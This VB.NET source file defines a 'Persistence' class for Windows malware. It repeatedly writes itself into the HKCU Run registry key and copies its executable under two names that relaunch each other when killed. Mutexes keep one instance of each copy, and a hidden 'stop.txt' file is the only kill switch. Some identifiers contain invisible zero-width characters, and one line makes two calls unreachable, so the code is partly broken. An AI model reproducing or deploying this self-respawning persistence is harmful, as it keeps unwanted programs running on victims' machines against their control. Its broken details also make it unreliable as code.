Public Class Persistence

   Public Sub New(ByVal FX As String, ByVal FXX As String, ByVal MX As String, ByVal MXX As String)
        Me.F1 = FX
        Me.F2 = FXX
        Me.M1 = MX
        Me.M2 = MXX
    End Sub

    Private Sub Registry_P()
        For i As Integer = 0 To 1 Step 0
            Try
                Dim R As Microsoft.Win32.RegistryKey
                R = Microsoft.Win32.Registry.CurrentUser
                Dim K As Microsoft.Win32.RegistryKey = R.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                K.SetValue(F1, Chr(34) & PT & F1 & EX & Chr(34), Microsoft.Win32.RegistryValueKind.String)
                System.Threading.Thread.Sleep(200) : Catch : System.Threading.Thread.Sleep(200) : End Try
        Next
    End Sub

    Private Sub SafeDisable()
        If System.IO.File.Exists(PT & "stop.txt") Then
            Process.GetCurrentProcess.Kill()
        End If
    End Sub

    Private Sub File_P()
        For i As Integer = 0 To 1 Step 0
            Try
                SafeDisable()
                If C(F1) = False Then
                    Try : System.IO.File.Copy(System.Diagnostics.Process.GetCurrentProcess.MainModule.File​Name, PT & F1 & EX) : Catch : End Try
                    Process.Start(PT & F1 & EX)
                End If
                If C(F2) = False Then
                    Try : System.IO.File.Copy(System.Diagnostics.Process.GetCurrentProcess.MainModule.File​Name, PT & F2 & EX) : Catch : End Try
                    Process.Start(PT & F2 & EX)
                End If
                System.Threading.Thread.Sleep(200) : Catch : System.Threading.Thread.Sleep(200) : End Try
        Next
    End Sub

    Private Function C(ByVal N As String) As Boolean
        Try
            Dim P As System.Diagnostics.Process = System.Diagnostics.Process.GetProcessesByName(N)(0)
            Return True
        Catch
            Return False
        End Try
    End Function

    Private Sub D(ByVal N As String)
        If Not System.IO.File.Exists(PT & N) = True Then
            System.IO.File.Copy(System.Diagnostics.Process.GetCurrentProcess.MainModule​.FileName, PT & N)
            Process.Start(PT & N)
            Process.GetCurrentProcess.Kill()
        End If
    End Sub
    Dim OM As System.Threading.Mutex
    Private Sub M()
        Dim MN As String = System.IO.Path.GetFileNameWithoutExtension(System.Diagnostics.Process.GetCurrent​Process.MainModule.FileName)
        If MN = F1 Then
            OM = New System.Threading.Mutex(False, M1)
        Else
            OM = New System.Threading.Mutex(False, M2)
        End If
        If OM.WaitOne(0, False) = False Then
            OM.Close()
            OM = Nothing
            Process.GetCurrentProcess.Kill()
        End If
    End Sub

    Public Sub Enable()
        If RS = True Then Exit Sub : D(F1 & EX) : M()
        T1 = New Threading.Thread(AddressOf Registry_P) : T2 = New Threading.Thread(AddressOf File_P)
        T1.SetApartmentState(Threading.ApartmentState.STA) : T2.SetApartmentState(Threading.ApartmentState.STA)
        T1.Start() : T2.Start() : RS = True
    End Sub

    Public Sub Disable()
        If RS = False Then Exit Sub
        T1.Abort()
        T2.Abort()
        RS = False
    End Sub

#Region "Variables"
    Private T1 As System.Threading.Thread
    Private T2 As System.Threading.Thread
    Private M1 As String = "Default1"
    Private M2 As String = "Default2"
    Private F1 As String = "Name1"
    Private F2 As String = "Name2"
    Private EX As String = ".exe"
    Private RS As Boolean = False
    Private PT As String = System.Diagnostics.Process.GetCurrentProcess.MainModule.FileName.Replace(System.​IO.Path.GetFileName(System.Diagnostics.Process.GetCurrentProcess.MainModule.File​Name), "")
#End Region

End Class
